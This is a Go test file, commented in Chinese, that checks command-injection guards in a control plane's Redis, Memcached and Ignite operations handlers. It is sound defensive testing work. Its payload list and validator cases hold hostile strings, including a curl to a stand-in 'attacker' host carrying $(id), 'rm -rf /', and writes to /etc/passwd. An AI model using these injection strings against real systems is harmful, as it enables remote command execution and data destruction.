package controlplane

// cache_injection_test.go — Redis/Memcached/Ignite 运维 handler 的注入守卫。
//
// 背景（docs/opsmesh-authz-audit-2026-11-04.md §3）：cache_ops.go 里 version、
// nodes、master、host、user、password、rules、maxmemory、eviction 等字段此前
// 全部裸拼进要下发到 agent 的脚本。本文件按字段语义分两类钉死：
//   - 窄域（version/mode/nodes/master/host/user/rules/maxmemory/eviction/port
//     replicas/quorum/maxClients/ioThreads）⇒ 白名单，含元字符即 400；
//   - 宽域（password）⇒ 允许任意字符，但必须经 shellquote.Quote（不裸拼）。
//
// 判据与 activemq_ext_injection_test.go 同构：载荷一律 400，合法值放行。

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/Levango7/OpsMesh/internal/config"
	"github.com/Levango7/OpsMesh/internal/store"
)

func newCacheInjectServer() *Server {
	return &Server{
		store:       store.NewMemoryStore(),
		cfg:         &config.Config{TaskMaxRetries: 1, Demo: false, TrustGatewayHeaders: true},
		requireAuth: false,
	}
}

func cacheReq(t *testing.T, h http.HandlerFunc, path, body string) *httptest.ResponseRecorder {
	t.Helper()
	req := httptest.NewRequest(http.MethodPost, path, strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("X-Tenant-ID", "default")
	req.Header.Set("X-User-Id", "audit")
	req.Header.Set("X-User-Roles", "admin")
	rec := httptest.NewRecorder()
	h(rec, req)
	return rec
}

var cachePayloads = []string{
	`x"; curl -s http://attacker/$(id); echo "`,
	"$(id)",
	"`id`",
	"a; rm -rf /",
	"a | tee /etc/passwd",
	"../..",
	"' || true #",
}

// TestCacheDeployRejectsBadVersionAndMode deploy 的 version/mode 白名单。
func TestCacheDeployRejectsBadVersionAndMode(t *testing.T) {
	s := newCacheInjectServer()
	for _, p := range cachePayloads {
		for _, body := range []string{
			`{"type":"redis","version":"` + p + `"}`,
			`{"type":"ignite","version":"` + p + `"}`,
			`{"type":"memcached","version":"` + p + `"}`,
			`{"type":"redis","mode":"` + p + `"}`,
		} {
			rec := cacheReq(t, s.handleCacheDeploy, "/api/v1/cache/deploy", body)
			if rec.Code != http.StatusBadRequest {
				t.Errorf("%s 应 400，实得 %d：%s", body, rec.Code, rec.Body.String())
			}
		}
	}
	// 合法值放行
	for _, ok := range []string{`{"type":"redis","version":"7.2","mode":"standalone"}`,
		`{"type":"ignite","version":"2.16.0"}`, `{"type":"memcached","version":"1.6.29"}`} {
		rec := cacheReq(t, s.handleCacheDeploy, "/api/v1/cache/deploy", ok)
		if rec.Code == http.StatusBadRequest {
			t.Errorf("%s 被误拒：%s", ok, rec.Body.String())
		}
	}
}

// TestRedisClusterRejectsInjectedNodes nodes 是 host:port 列表。
func TestRedisClusterRejectsInjectedNodes(t *testing.T) {
	s := newCacheInjectServer()
	for _, p := range cachePayloads {
		for _, action := range []string{"create", "add-node", "remove-node"} {
			body := `{"action":"` + action + `","nodes":"10.0.0.1:6379,` + p + `"}`
			rec := cacheReq(t, s.handleRedisCluster, "/api/v1/cache/redis/cluster", body)
			if rec.Code != http.StatusBadRequest {
				t.Errorf("action=%s nodes 含 %q 应 400，实得 %d", action, p, rec.Code)
			}
		}
	}
	rec := cacheReq(t, s.handleRedisCluster, "/api/v1/cache/redis/cluster",
		`{"action":"create","nodes":"10.0.0.1:6379,10.0.0.2:6379","replicas":1}`)
	if rec.Code == http.StatusBadRequest {
		t.Errorf("合法 nodes 被误拒：%s", rec.Body.String())
	}
}

// TestRedisSentinelRejectsInjectedMasterAndHost master(标识符) 与 host(主机名)。
func TestRedisSentinelRejectsInjectedMasterAndHost(t *testing.T) {
	s := newCacheInjectServer()
	for _, p := range cachePayloads {
		rec := cacheReq(t, s.handleRedisSentinel, "/api/v1/cache/redis/sentinel",
			`{"action":"monitor","master":"`+p+`","host":"10.0.0.1"}`)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("master=%q 应 400，实得 %d", p, rec.Code)
		}
		rec = cacheReq(t, s.handleRedisSentinel, "/api/v1/cache/redis/sentinel",
			`{"action":"monitor","master":"mymaster","host":"`+p+`"}`)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("host=%q 应 400，实得 %d", p, rec.Code)
		}
	}
}

// TestRedisSecurityRejectsInjectedUserAndRules user(标识符)+rules(ACL 规则)。
func TestRedisSecurityRejectsInjectedUserAndRules(t *testing.T) {
	s := newCacheInjectServer()
	for _, p := range cachePayloads {
		for _, body := range []string{
			`{"action":"add-user","user":"` + p + `","password":"pw"}`,
			`{"action":"add-user","user":"u","password":"pw","rules":"` + p + `"}`,
			`{"action":"delete-user","user":"` + p + `"}`,
			`{"action":"set-acl","user":"u","rules":"` + p + `"}`,
		} {
			rec := cacheReq(t, s.handleRedisSecurity, "/api/v1/cache/redis/security", body)
			if rec.Code != http.StatusBadRequest {
				t.Errorf("%s 应 400，实得 %d：%s", body, rec.Code, rec.Body.String())
			}
		}
	}
}

// TestRedisSecurityAllowsSpecialPasswordButQuotes password 合法域宽，不得白名单；
// 但特殊字符必须被接受（转义路径）而不是误拒。
func TestRedisSecurityAllowsSpecialPasswordButQuotes(t *testing.T) {
	s := newCacheInjectServer()
	body := `{"action":"add-user","user":"u","password":"p'$(id)x","rules":"+@all ~*"}`
	rec := cacheReq(t, s.handleRedisSecurity, "/api/v1/cache/redis/security", body)
	if rec.Code == http.StatusBadRequest {
		t.Fatalf("含特殊字符的密码被误拒：%s", rec.Body.String())
	}
}

// TestRedisTuningRejectsBadMemoryAndPolicy maxmemory / eviction policy 白名单。
func TestRedisTuningRejectsBadMemoryAndPolicy(t *testing.T) {
	s := newCacheInjectServer()
	for _, p := range cachePayloads {
		rec := cacheReq(t, s.handleRedisTuning, "/api/v1/cache/redis/tuning",
			`{"action":"set","maxMemory":"`+p+`"}`)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("maxMemory=%q 应 400，实得 %d", p, rec.Code)
		}
		rec = cacheReq(t, s.handleRedisTuning, "/api/v1/cache/redis/tuning",
			`{"action":"set","eviction":"`+p+`"}`)
		if rec.Code != http.StatusBadRequest {
			t.Errorf("eviction=%q 应 400，实得 %d", p, rec.Code)
		}
	}
	for _, ok := range []string{
		`{"action":"set","maxMemory":"512mb","eviction":"allkeys-lru"}`,
		`{"action":"set","maxMemory":"1073741824"}`,
	} {
		rec := cacheReq(t, s.handleRedisTuning, "/api/v1/cache/redis/tuning", ok)
		if rec.Code == http.StatusBadRequest {
			t.Errorf("%s 被误拒：%s", ok, rec.Body.String())
		}
	}
}

// TestHelperValidators 直接钉三个新增校验函数的边界。
func TestHelperValidators(t *testing.T) {
	for _, ok := range []string{"512mb", "2gb", "1024", "1073741824"} {
		if !isRedisMemory(ok) {
			t.Errorf("isRedisMemory(%q) 误拒", ok)
		}
	}
	for _, bad := range []string{"", "mb", "5x", "5 mb", "$(id)", "1.5gb"} {
		if isRedisMemory(bad) {
			t.Errorf("isRedisMemory(%q) 误收", bad)
		}
	}
	for _, ok := range []string{"noeviction", "allkeys-lru", "volatile-ttl"} {
		if !isRedisEvictionPolicy(ok) {
			t.Errorf("isRedisEvictionPolicy(%q) 误拒", ok)
		}
	}
	if isRedisEvictionPolicy("$(id)") {
		t.Error("isRedisEvictionPolicy 误收元字符")
	}
	for _, ok := range []string{"+@all ~*", `~key:* +get`, "reset", "&channel:*"} {
		if !isRedisACLRules(ok) {
			t.Errorf("isRedisACLRules(%q) 误拒", ok)
		}
	}
	for _, bad := range []string{"+@all ~*; rm -rf /", `$(id)`, "a;b", "~x y;z",
		"&; rm -rf /", "&ch;id", "+@all;id", "~k;id"} {
		if isRedisACLRules(bad) {
			t.Errorf("isRedisACLRules(%q) 误收", bad)
		}
	}
}
